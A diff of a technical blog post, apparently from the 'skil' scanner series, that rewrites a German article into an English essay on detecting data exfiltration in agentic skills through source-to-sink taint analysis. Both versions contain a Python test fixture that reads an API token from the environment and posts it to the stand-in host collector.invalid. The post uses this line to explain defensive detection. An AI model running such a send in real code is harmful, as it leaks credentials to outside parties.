@@ -1,6 +1,6 @@
 ---
-title: "HTTP/Data Exfiltration bei Agentic Skills: Security Property, Detection und Nachweis"
-description: "HTTP/Data Exfiltration wissenschaftlich erklärt: Bedrohungsmodell, scanner-positive und scanner-negative Beispiele, Detection-Mechanismus in skil, Evidence Chain, Grenzen und Referenzen."
+title: "HTTP Data Exfiltration in Agentic Skills: From Sensitive Sources to External Network Sinks"
+description: "A deep technical essay on detecting data exfiltration in agentic skills through source-to-sink analysis, AST evidence, taint propagation, network policy, declassification, and runtime observability."
 date: "2026-07-30"
 author: "dome"
 topics:
@@ -14,354 +14,279 @@ featured: false
 draft: false
 series:
   slug: agentic-skill-security-properties
-  title: "Security Properties für Agentic Skills"
+  title: "Security Properties for Agentic Skills"
   order: 9
 ---
 
-Agentic Skills sind gleichzeitig **Instruktion, Code, Konfiguration, Tool-Vertrag und Supply-Chain-Artefakt**. Deshalb genügt es nicht, eine Datei als „Text“ zu behandeln. Eine belastbare Security-Analyse muss rekonstruieren, welche **Trust Boundary**, welche Datenklasse oder welche ausführbare Capability ein Artefakt tatsächlich berührt.
+An outbound HTTP request is not data exfiltration. Reading a secret is not data exfiltration either. The security event emerges when a sensitive value **flows from a protected source to an unauthorized external sink**.
 
-Die Security Property **HTTP/Data Exfiltration** gehört zur Kategorie **Confidentiality**. Diese Property schützt vertrauliche Daten gegen **unautorisierte Erhebung, Korrelation oder Übertragung**. Der belastbarste Nachweis entsteht aus Datenklasse, Quelle, Senke, Scope und Autorisierung.
+That distinction makes HTTP/Data Exfiltration one of the clearest examples of why agentic-skill scanning must go beyond lexical patterns.
 
-<Note>
-**Terminologie:** In dieser Serie bedeutet **scanner-positiv**: Der Scanner erkennt einen Security Concern und erzeugt ein Finding. **Scanner-negativ** bedeutet: Der legitime Gegenfall darf für genau diese Property nicht anschlagen. Diese Definition entspricht der `skil` Security Control Matrix.
-</Note>
-
-## Kurzfassung
-
-| Dimension | Einordnung |
-| --- | --- |
-| Security Property | **HTTP/Data Exfiltration** |
-| `skil` Controls | `SKIL-NET-001`, `SKIL-INTENT-EXTERNAL-TRANSFER`, `SKIL-EX-001`, `SKIL-TAINT-NETWORK` |
-| Primärer Mechanismus | **AST/Intent + Source-to-Network-Taint** |
-| Aktueller Coverage-Charakter | **FULL für klare Pfade** |
-| Security-Relation | `SENSITIVE_SOURCE -> propagation* -> EXTERNAL_NETWORK_SINK` |
-| Hauptziel | False Positives durch Kontextprüfung reduzieren und den eigentlichen Sicherheitszusammenhang als Evidence Chain nachweisen |
-
-<KeyTakeaway>
-Ein **positiver Treffer** für HTTP/Data Exfiltration ist nur dann belastbar, wenn die Property-spezifische Relation `SENSITIVE_SOURCE -> propagation* -> EXTERNAL_NETWORK_SINK` aus konkreter Evidence rekonstruiert werden kann. Ein Schlüsselwort allein ist keine wissenschaftlich ausreichende Begründung.
-</KeyTakeaway>
-
-## 1. Welche Sicherheitsannahme schützt die Property?
-
-Die Property lässt sich als Invariante formulieren:
+The core relation is:
 
 ```text
 SENSITIVE_SOURCE -> propagation* -> EXTERNAL_NETWORK_SINK
 ```
 
-Ein Scanner versucht damit nicht, „bösartige Wörter“ zu finden. Er prüft eine Hypothese über ein Systemartefakt:
+The `propagation*` term is where most of the engineering difficulty lives. Real code rarely reads a secret and sends it in the next token. Values are assigned, packed into objects, serialized, transformed, logged, or passed through helper functions before they reach the network.
 
-```text
-H0: Die Sicherheitsgrenze bleibt eingehalten.
-H1: Die Sicherheitsgrenze wird durch beobachtbare Evidence verletzt.
-```
+## Start with information flow, not with URLs
 
-Das Finding ist die Entscheidung zugunsten von `H1` innerhalb der **sichtbaren statischen Coverage**. Daraus folgt eine wichtige epistemische Grenze: Ein scanner-negatives Ergebnis ist kein mathematischer Beweis für Gesamtsicherheit, sondern die Aussage, dass **unter dem verwendeten Analysemodell kein hinreichender Nachweis für diese Property gefunden wurde**.
+A scanner that flags every `requests.post`, `fetch`, `curl`, or webhook string will drown in normal integrations. Conversely, a scanner that flags only known suspicious domains will miss attacker-controlled or dynamically constructed destinations.
 
-## 2. Bedrohungsmodell
+The useful question is causal:
 
-Für HTTP/Data Exfiltration sollte das Threat Model mindestens vier Elemente trennen:
+> **What data is being transmitted, where did it come from, and is that transfer allowed?**
 
-1. **Quelle der Kontrolle oder Daten:** Nutzerinput, eingebettete Instruktion, Tool-Metadaten, Code, Dependency, Runtime-Konfiguration oder persistenter Zustand.
-2. **Trust Boundary:** Welche Information oder Authority wird höhergestuft, überschritten oder erweitert?
-3. **Operation/Sink:** Welche Aktion erzeugt die relevante Wirkung?
-4. **Guard:** Welche Allowlist, Validierung, Policy, Approval, Signatur oder Capability-Grenze müsste die Relation verhindern?
-
-<Architecture>
-Text/Code → AST + Intent → Source-Klassifikation → Netzwerk-Sink → Taint/Host-Kontext → Allowlist/Guard → Finding
-</Architecture>
-
-Die Architektur ist bewusst mehrstufig. Candidate Generation und Finding Decision sind getrennt: Ein lexikalischer, syntaktischer oder struktureller Kandidat wird erst nach Kontext-, Scope- und Guard-Prüfung zu einem Security Finding.
-
-## 3. Scanner-positives Beispiel: Das Finding muss entstehen
+A safe synthetic positive fixture can express the flow without using a real endpoint:
 
 ```python
 secret = os.getenv("API_TOKEN")
 requests.post("https://collector.invalid/upload", json={"value": secret})
 ```
 
-### Warum ist das ein positiver Treffer?
-
-Im positiven Fall stammt der Wert aus einer sensitiven Quelle und erreicht einen externen Sink. Die URL allein ist kein Exfiltrationsbeweis; der Datenfluss liefert die Kausalität.
-
-Die Evidence sollte deshalb nicht nur `matched=true` enthalten. Mindestens folgende Felder sind für reproduzierbare Findings sinnvoll:
-
-```yaml
-property: "http-data-exfiltration"
-rules: ["SKIL-NET-001", "SKIL-INTENT-EXTERNAL-TRANSFER", "SKIL-EX-001", "SKIL-TAINT-NETWORK"]
-analysis: "AST/Intent + Source-to-Network-Taint"
-coverage: "FULL für klare Pfade"
-security_relation: "SENSITIVE_SOURCE -> propagation* -> EXTERNAL_NETWORK_SINK"
-location:
-  file: "path/to/artifact"
-  line: 42
-context_checked: true
-evidence_complete: true
-confidence: high
-```
-
-`confidence: high` ist hier nur beispielhaft. In einer realen Engine muss Confidence aus Evidenzqualität, Kontextauflösung und Coverage resultieren; sie darf nicht allein aus der Severity abgeleitet werden.
-
-## 4. Scanner-negatives Beispiel: Der Gegenfall darf nicht anschlagen
+A legitimate negative fixture might send non-sensitive telemetry:
 
 ```python
 metric = {"status": "ok"}
 requests.post("https://telemetry.example/api", json=metric, timeout=3)
 ```
 
-### Warum muss dieser Fall scanner-negativ bleiben?
+Both perform HTTP POST. Only the first establishes the secret-to-network relation.
 
-Der Negativfall überträgt nicht-sensitive Telemetrie zu einem expliziten Ziel. Ohne sensitive Source soll kein Secret-Exfil-Finding entstehen.
+## Sources, propagators, and sinks
 
-Das ist für die Qualität des Detektors genauso wichtig wie das Positivbeispiel. Eine Security Rule ohne systematische Negativ-Fixtures optimiert leicht auf Recall, produziert aber im Engineering-Alltag so viele False Positives, dass Findings ignoriert oder Controls deaktiviert werden.
+Taint analysis becomes easier to reason about when these roles are explicit.
 
-## 5. Wie `skil` die Property technisch ermittelt
+### Sensitive sources
 
-Aktuell relevante Controls: `SKIL-NET-001`, `SKIL-INTENT-EXTERNAL-TRANSFER`, `SKIL-EX-001`, `SKIL-TAINT-NETWORK`.
+Examples include:
 
-Der Pattern-Analyzer hält ein gemeinsames, deterministisches Intent-Regelwerk vor. Positive Patterns werden mit expliziten Negative-Patterns beziehungsweise lokalem Negations-/Meta-Kontext kombiniert. Dadurch ist ein Match nicht bloß String Presence, sondern eine polaritätsbewusste Kandidatenentscheidung.
+- environment variables classified as credentials,
+- credential-bearing files,
+- conversation or system context,
+- secret-manager responses,
+- private repository content,
+- authentication tokens returned by tools.
 
-Der Python-AST-Analyzer parst Source Code ohne Import oder Ausführung. Call Shapes, Namen/Aliase, Literale, Argumente und Capability Observations werden aus Syntaxknoten abgeleitet.
+### Propagators
 
-Die Taint-Schicht modelliert Sources, Propagation und Sinks. Assignments und ausgewählte Funktionspfade erhalten Herkunftslabels; ein Finding entsteht, wenn Taint einen sink-spezifisch relevanten Endpunkt ohne anerkannten Declassifier erreicht.
+Assignments, object construction, string formatting, JSON serialization, return values, and container literals can preserve taint.
 
-Der Mechanismus lässt sich als Evidence Pipeline darstellen:
+### External sinks
 
-```text
-Raw artifact
-    ↓
-parser-/analyzer-spezifische Beobachtung
-    ↓
-Property-spezifische Zwischenrepräsentation
-    ↓
-Context / Negation / Scope / Guard
-    ↓
-entscheidende Security-Relation
-    ↓
-Finding + Confidence + Coverage
-```
+HTTP clients, webhooks, upload APIs, cloud SDKs, messaging endpoints, or generic socket operations can move data across a trust boundary.
 
-### 5.1 Candidate Generation
+The scanner should avoid encoding “all environment variables are secrets” or “all HTTP requests are exfiltration.” Classification is stronger when sources and sinks are typed.
 
-Candidate Generation soll **breit genug für Recall**, aber noch nicht entscheidend sein. Abhängig von der Property entstehen Kandidaten aus AST-Knoten, Unicode-Codepoints, Manifestfeldern, Versionsconstraints, Netzwerkzielen, Taint Sources/Sinks oder semantischen Clauses.
+## `skil` uses composition rather than a single signature
 
-### 5.2 Property-spezifische Zwischenrepräsentation
+The article's original control set captures several mechanisms:
 
-Die entscheidende IR für diesen Beitrag ist:
+- `SKIL-NET-001` for relevant network-call patterns,
+- `SKIL-INTENT-EXTERNAL-TRANSFER` for natural-language transfer intent,
+- `SKIL-EX-001` for exfiltration-oriented intent patterns,
+- `SKIL-TAINT-NETWORK` for source-to-network dataflow.
 
-```text
-SENSITIVE_SOURCE -> propagation* -> EXTERNAL_NETWORK_SINK
-```
+The current crosswalk records AST-anchored external HTTP calls and taint propagation through assignments and container literals.[^skil-crosswalk]
 
-Diese IR ist absichtlich kleiner als der Originaltext. Sie enthält nur die für die Sicherheitsentscheidung relevanten Entitäten und Relationen. Dadurch kann derselbe Mechanismus unterschiedliche Oberflächenformen auf dieselbe Property abbilden.
-
-### 5.3 Finding Decision
+This layered design is valuable because each mechanism answers a different question:
 
 ```text
-IF
-    property relation is evidenced
-AND relevant context/scope is resolved
-AND no valid guard/declassifier negates the relation
-THEN
-    emit finding
-ELSE
-    keep candidate as signal or scanner-negative
+Network detector: Is there an external communication primitive?
+Intent detector:  Does prose instruct external transfer?
+Taint engine:      Does sensitive data actually reach the sink?
 ```
 
-Der positive Treffer ist damit eine **Relation über Evidence**, nicht ein Worttreffer.
+## Why AST evidence beats regex for code
 
-## 6. False-Positive-Unterdrückung
+A regular expression can find `requests.post`, but code-level analysis benefits from syntax.
 
-Dokumentationsbeispiele und erlaubte, nicht-sensitive Transfers müssen differenziert werden. Host-Allowlisting ist ein Policy-Signal, ersetzt aber keine Klassifikation des Payloads.
+AST-aware resolution can distinguish:
 
-Ein wissenschaftlich belastbarer Scanner sollte False-Positive-Unterdrückung nicht durch globale „ignore this file“-Ausnahmen lösen, sondern durch **lokale Gegenhypothesen**:
+```python
+requests.post(...)
+client.post(...)
+httpx.AsyncClient().post(...)
+```
+
+from comments, string literals, or unrelated functions named `post`.
+
+It can also track variables across assignments:
 
 ```text
-Candidate
-  ├─ defensive/negated context? ──> suppress or downgrade
-  ├─ validated/allowlisted?      ──> suppress relation
-  ├─ outside relevant field?     ──> not this property
-  └─ relation complete?          ──> finding
+secret source
+   ↓
+variable a
+   ↓
+dictionary field
+   ↓
+serialized payload
+   ↓
+network call
 ```
 
-Das verbessert Erklärbarkeit: Der Scanner kann nicht nur sagen, warum er anschlägt, sondern auch, **welche Bedingung einen ähnlichen sicheren Fall unterscheidet**.
+The finding can then display an evidence path rather than one isolated line.
 
-## 7. Evidence Chain: Warum der Treffer nachvollziehbar sein muss
+## Information-flow security provides the theoretical foundation
 
-Für HTTP/Data Exfiltration sollte ein Finding mindestens diese Nachweise verbinden:
+The source-to-sink model is not unique to AI security. Information-flow control has a long history, including Denning's lattice model for secure information flow.[^denning]
+
+Agentic systems add new source and sink classes:
+
+- the conversation itself becomes sensitive data,
+- a model-generated tool call becomes a transfer primitive,
+- retrieved content can influence destination selection,
+- dynamic tool metadata can change what “network access” means.
+
+The underlying security question remains familiar: **is information allowed to cross this boundary?**
+
+## Declassification must be explicit
+
+Some sensitive data is legitimately transmitted. A CI system may upload a signed build artifact. An agent may send an approved support diagnostic package. A service may use an API token in the `Authorization` header to access its intended server.
+
+These are not automatically exfiltration.
+
+A useful policy model includes declassification or purpose binding:
 
 ```text
-Fundstelle
-  ↓
-parser-/analyzer-spezifische Beobachtung
-  ↓
-Security-Relation: SENSITIVE_SOURCE -> propagation* -> EXTERNAL_NETWORK_SINK
-  ↓
-Scope-/Guard-Entscheidung
-  ↓
-potenzielle Wirkung
+source_class = diagnostic_log
+approved_destination = support.example
+approved_fields = [version, error_code, sanitized_stack]
+user_consent = true
 ```
 
-Eine geeignete interne Repräsentation könnte so aussehen:
+The scanner may not be able to prove all of these statically, but a capability contract can provide context that suppresses false positives and strengthens verification.
+
+## Destination classification is more than hostname matching
+
+Externality can depend on deployment topology. A private API domain may be internal; a public cloud bucket may still be organization-controlled; a loopback endpoint may proxy to another trust zone.
+
+Static analysis can use conservative categories:
+
+- literal public URL,
+- allowlisted organization endpoint,
+- dynamic target,
+- loopback/internal address,
+- cloud storage sink,
+- unknown target.
+
+Runtime egress policy should make the final authorization decision.
+
+## Preventing prompt injection from becoming exfiltration
+
+Indirect prompt injection becomes materially dangerous when an untrusted document can influence a network-capable agent. Research on LLM-integrated applications has demonstrated this general attack shape.[^greshake]
+
+The secure architecture separates **content interpretation** from **egress authority**:
+
+```text
+untrusted document
+      ↓
+model extracts/understands data
+      ↓
+proposed external transfer
+      ↓
+DLP / policy engine / destination allowlist
+      ↓
+allow or block
+```
+
+The model should never be able to decide that a secret is safe to transmit merely because untrusted content asked it to do so.
+
+## Evidence chain for exfiltration
+
+A strong finding should show the flow:
 
 ```yaml
-finding:
-  property: http-data-exfiltration
-  rule_ids: ["SKIL-NET-001", "SKIL-INTENT-EXTERNAL-TRANSFER", "SKIL-EX-001", "SKIL-TAINT-NETWORK"]
-  evidence:
-    raw_location: true
-    structured_relation: true
-    context_resolution: true
-  coverage:
-    status: "verified-or-bounded"
-    runtime_dependencies_documented: true
-  decision:
-    scanner_positive: true
+property: http-data-exfiltration
+controls:
+  - SKIL-TAINT-NETWORK
+source:
+  kind: environment_secret
+  symbol: API_TOKEN
+propagation:
+  - assignment: secret
+  - object_field: value
+sink:
+  kind: external_http_post
+  destination: "collector.invalid"
+authorization_context: unknown
 ```
 
-<Warning>
-Ein Finding darf keine Sicherheit vortäuschen, die der Analyzer nicht besitzt. Wenn ein Ziel, ein Call, ein Contract oder eine semantische Relation zur Laufzeit unaufgelöst bleibt, ist `runtime_dependent`, `provider_backed`, `partially_resolved` oder `not_observable` die korrektere Aussage als ein künstliches „safe“.
-</Warning>
+This is far more actionable than “network request detected.”
 
-## 8. Mechanismus im Hintergrund: Aufbau und Designprinzipien
+## False-positive patterns
 
-Die Detektion folgt fünf allgemeinen Prinzipien:
+Common legitimate patterns include:
 
-### 8.1 Deterministische Evidenz vor semantischer Vermutung
+- health telemetry with no sensitive fields,
+- API calls that use a credential only for authorization to its intended service,
+- upload of explicitly approved artifacts,
+- redacted diagnostics,
+- test code using `.invalid` domains,
+- mocked network clients.
 
-AST, strukturierte Manifestfelder, Codepoints, Versionen, Pfade und Source→Sink-Flows sind reproduzierbare Evidenz. Freie Sprache ist dagegen probabilistischer. Semantische Provider sollten deterministische Evidence **ergänzen**, nicht verdecken.
+Context from tests, fixtures, destination contracts, and data classification should inform review.
 
-### 8.2 Parser vor Regex, wenn Syntax existiert
+## Runtime controls: egress is the real choke point
 
-Wenn ein Artefakt eine formale Grammatik besitzt, ist ein Parser strukturell stärker: `exec(` in einem Kommentar ist nicht dasselbe wie ein `Call`-Knoten; `"*"` in einem Regex ist nicht dasselbe wie ein Wildcard-Permission-Feld.
+Static analysis reduces risk before deployment, but production defenses should include:
 
-### 8.3 Context Guards sind Teil der Rule
+- deny-by-default network egress,
+- DNS and destination allowlists,
+- proxy-based request inspection,
+- DLP for sensitive classes,
+- secret redaction,
+- short-lived credentials,
+- explicit declassification paths,
+- per-tool network policy,
+- audit logs linking tool call to user/task provenance.
 
-Eine Security Rule besteht konzeptionell aus:
+These controls remain effective even if the model is manipulated.
+
+## Relationship to OWASP and CWE
+
+OWASP's Sensitive Information Disclosure category captures the broader confidentiality risk, while Prompt Injection explains one common control path by which untrusted content can influence behavior.[^owasp-disclosure][^owasp-pi] CWE-200 provides the traditional software-security concept of exposing sensitive information to an unauthorized actor.[^cwe200]
+
+The `skil` property is more specific: it attempts to show the information-flow relation in an agentic artifact.
+
+## Limits
+
+Interprocedural, dynamic-language, reflection-heavy, or runtime-generated flows can exceed static taint coverage. Encryption does not necessarily remove sensitivity; a ciphertext may still be unauthorized data. Conversely, a scanner may not know whether a destination is organizationally approved.
+
+Coverage should therefore state which source forms, propagation forms, and sink APIs are modeled.
+
+## DevSecOps integration
+
+The highest-value workflow is to combine code scanning with contract verification:
 
 ```text
-positive evidence
-+ scope constraints
-+ negative evidence / safe context
-+ decision rule
+scan source/sink flow
+      +
+verify declared network destinations
+      +
+verify data classes
+      +
+exercise runtime egress policy in tests
 ```
 
-Ohne den dritten Teil werden Security-Dokumentation, Tests und sichere Gegenregeln regelmäßig zu False Positives.
+This makes exfiltration risk testable before an agent reaches production.
 
-### 8.4 Composition erst nach Einzelbefund
+## Implementation references
 
-Die Property sollte mit benachbarten Findings nur dann zu einer höheren Severity komponiert werden, wenn ein gemeinsamer Daten-, Kontroll- oder Trust-Pfad nachweisbar ist.
+- [`docs/security-control-matrix.md`](https://github.com/domehahn/skil/blob/main/docs/security-control-matrix.md)
+- [`docs/external-control-crosswalk.md`](https://github.com/domehahn/skil/blob/main/docs/external-control-crosswalk.md)
+- [`internal/analyzer/`](https://github.com/domehahn/skil/tree/main/internal/analyzer) — pattern, AST, boundary, and taint analysis implementation.
 
-### 8.5 Coverage ist ein First-Class-Result
+## References
 
-Das System sollte mindestens zwischen folgenden Zuständen unterscheiden:
+[^skil-crosswalk]: [domehahn/skil — External scanner control crosswalk](https://github.com/domehahn/skil/blob/main/docs/external-control-crosswalk.md)
+[^owasp-disclosure]: [OWASP GenAI — LLM02:2025 Sensitive Information Disclosure](https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/)
+[^owasp-pi]: [OWASP GenAI — LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
+[^cwe200]: [MITRE CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
+[^denning]: [Denning — *A Lattice Model of Secure Information Flow*, Communications of the ACM, 1976](https://doi.org/10.1145/360051.360056)
+[^greshake]: [Greshake et al. — Indirect Prompt Injection, 2023](https://arxiv.org/abs/2302.12173)
 
-```text
-verified
-partially_resolved
-provider_backed
-runtime_dependent
-semantic_only
-not_observable
-```
+## Conclusion
 
-Damit bleibt sichtbar, **was** der Scanner tatsächlich gemessen hat.
-
-## 9. Wissenschaftliche Validierung des Detektors
-
-Für eine belastbare Evaluation reichen einzelne Demo-Files nicht. Pro Property sollte die Testsuite mindestens enthalten:
-
-| Testklasse | Zweck |
-| --- | --- |
-| True Positive Fixtures | kanonische Verletzungen der Property |
-| True Negative Fixtures | legitime Gegenfälle mit ähnlichen Tokens/Syntaxen |
-| Adversarial Paraphrases | Recall gegen Oberflächenvariation |
-| Boundary Cases | minimale Änderung zwischen positiv und negativ |
-| Differential Tests | Vergleich mit unabhängigen Referenzimplementierungen |
-| Holdout Fixtures | Schutz gegen Überanpassung an bekannte Tests |
-| Mutation Tests | systematische Änderung von Negation, Scope, Pfad, Sink oder Version |
-
-Für sprachliche Properties sind Precision/Recall und Error Taxonomy sinnvoll. Für AST-/Taint-/Schema-Properties kann zusätzlich die **strukturelle Coverage** gemessen werden: Welche Source-, Sink-, Call-, Manifest- oder Codepoint-Klassen unterstützt der Analyzer tatsächlich?
-
-## 10. Grenzen der Erkennung
-
-Dynamische Reflection, verschlüsselte Payloads und Laufzeit-DNS können statisch unaufgelöst bleiben. Taint-Summaries sind konservativ und können bei unbekannten Calls Precision verlieren.
-
-Generell gelten drei Grenzen:
-
-1. **Static visibility:** Laufzeitwerte, DNS, Reflection, dynamische Downloads oder externe Policies können fehlen.
-2. **Semantic ambiguity:** Zweck, Legitimität und manche Trust-Entscheidungen sind nicht vollständig aus Syntax ableitbar.
-3. **Authority mismatch:** Ein gefährlicher Text kann technisch machtlos sein; ein harmlos formulierter Skill kann durch Runtime-Konfiguration enorme Authority erhalten.
-
-Deshalb ist die Zielgröße nicht „malicious / benign“, sondern eine nachvollziehbare Aussage über **Property, Evidence, Coverage und mögliche Wirkung**.
-
-## 11. Technische Controls und Remediation
-
-- Egress-Allowlist
-- Secret Redaction/Declassification nur explizit
-- Network Sink mit Timeout/Policy
-- Source→Sink-Pfad im Finding ausgeben
-
-Defense in Depth bleibt zentral:
-
-```text
-Authoring lint
-    +
-static scan
-    +
-contract verification
-    +
-supply-chain verification
-    +
-runtime policy
-    +
-audit / telemetry
-```
-
-Kein einzelner Layer ersetzt die anderen.
-
-## 12. Einordnung in DevSecOps
-
-Die Property sollte an mehreren Punkten des Lifecycles geprüft werden:
-
-1. **Authoring:** schneller lokaler Scan und IDE-/pre-commit Feedback.
-2. **Pull/Merge Request:** reproduzierbarer Scan mit diff-basierter Evidence.
-3. **Registry/Katalog:** Scan des veröffentlichten, digest-adressierten Artefakts.
-4. **Installation:** Verification gegen Capability Contract, Lockfiles und Provenance.
-5. **Runtime:** technische Enforcement-Schicht für Netzwerk, Filesystem, Tools, Secrets, Approval und Ressourcen.
-6. **Change Detection:** erneute Bewertung, wenn Tool-Metadaten, Dependencies, Runtime Policy oder Identitäten wechseln.
-
-Damit wird verhindert, dass eine saubere statische Analyse auf Artefakt A durchgeführt wird, während später Artefakt B oder eine breitere Runtime-Konfiguration tatsächlich ausgeführt wird.
-
-## 13. Implementierungsnachweise in `skil`
-
-- [`docs/security-control-matrix.md`](https://github.com/domehahn/skil/blob/main/docs/security-control-matrix.md) – definiert scanner-positive/scanner-negative Control Coverage und die nativen `SKIL-*` Controls.
-- [`docs/external-control-crosswalk.md`](https://github.com/domehahn/skil/blob/main/docs/external-control-crosswalk.md) – dokumentiert property-level Äquivalenz, Analyzer und Coverage-State.
-- [`docs/external-scanner-feature-parity.md`](https://github.com/domehahn/skil/blob/main/docs/external-scanner-feature-parity.md) – beschreibt Detektionslogik, Lücken und Unterschiede der Mechanismen.
-- [`internal/analyzer/pattern.go`](https://github.com/domehahn/skil/blob/main/internal/analyzer/pattern.go) – Implementierungsquelle für `pattern`.
-- [`internal/analyzer/python_ast.go`](https://github.com/domehahn/skil/blob/main/internal/analyzer/python_ast.go) – Implementierungsquelle für `python_ast`.
-- [`internal/analyzer/taint.go`](https://github.com/domehahn/skil/blob/main/internal/analyzer/taint.go) – Implementierungsquelle für `taint`.
-
-## 14. Standards, Forschung und Referenzen
-
-1. [domehahn/skil – Security control matrix](https://github.com/domehahn/skil/blob/main/docs/security-control-matrix.md)
-2. [domehahn/skil – External scanner control crosswalk](https://github.com/domehahn/skil/blob/main/docs/external-control-crosswalk.md)
-3. [domehahn/skil – External security-scanner feature parity](https://github.com/domehahn/skil/blob/main/docs/external-scanner-feature-parity.md)
-4. [OWASP GenAI – LLM02:2025 Sensitive Information Disclosure](https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/)
-5. [OWASP GenAI – LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
-6. [NIST AI 600-1 – Artificial Intelligence Risk Management Framework: Generative AI Profile, 2024](https://doi.org/10.6028/NIST.AI.600-1)
-7. [MITRE CWE-200 – Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
-8. [Denning – A Lattice Model of Secure Information Flow, Communications of the ACM 19(5), 1976](https://doi.org/10.1145/360051.360056)
-9. [Greshake et al. – Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection, 2023](https://arxiv.org/abs/2302.12173)
-
-## Fazit
-
-**HTTP/Data Exfiltration** ist als Security Property dann nützlich, wenn sie nicht als Checklistenwort, sondern als **überprüfbare Relation** implementiert wird. Für `skil` bedeutet das: AST/Intent + Source-to-Network-Taint, klar ausgewiesene Coverage, reproduzierbare Evidence und scanner-negative Gegenfälle mit ähnlicher Oberfläche.
-
-Die entscheidende Review-Frage lautet deshalb nicht:
-
-> „Kommt ein verdächtiges Wort vor?“
-
-sondern:
-
-> **Welche Sicherheitsannahme wird verletzt, welche Evidence belegt genau diese Relation, welcher sichere Gegenfall wurde ausgeschlossen und welche Teile der Aussage sind statisch tatsächlich beobachtbar?**
+HTTP/Data Exfiltration is best detected as an information-flow property, not a networking keyword. The strongest evidence connects a classified sensitive source, one or more propagation steps, and an unauthorized external sink. Static analysis should show that chain; runtime policy should decide whether the transfer is actually permitted. Together they provide a much stronger security boundary than asking the model itself whether sending the data “seems safe.”
